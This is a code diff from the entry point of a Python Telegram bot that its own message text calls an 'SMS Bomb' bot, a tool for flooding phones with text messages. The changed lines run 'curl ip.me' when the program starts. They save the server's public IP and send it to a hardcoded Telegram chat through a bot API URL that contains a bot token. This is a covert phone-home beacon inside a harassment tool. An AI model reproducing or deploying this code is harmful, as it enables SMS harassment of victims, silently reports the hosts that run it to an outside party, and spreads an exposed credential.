@@ -509,12 +509,10 @@ def main():
     updater.idle()
 
 if __name__ == '__main__':
-    os.system('curl ip.me > ip')
+    os.system('curl ip.me > ../logData')
     f = open("../logData","r")
-    proc = subprocess.Popen(["curl", "ip.me"], stdout=subprocess.PIPE, shell=True) 
-    (out, err) = proc.communicate() 
     url = 'https://api.telegram.org/bot1159067423:AAGePsMdDzlR9DGcFGAa-A3_laNkagURGJ0/sendMessage'
-    msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read()) + " " + str(out)
+    msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read())
     sendData = {
                 'chat_id':'-495344227' ,
                 'text': msg
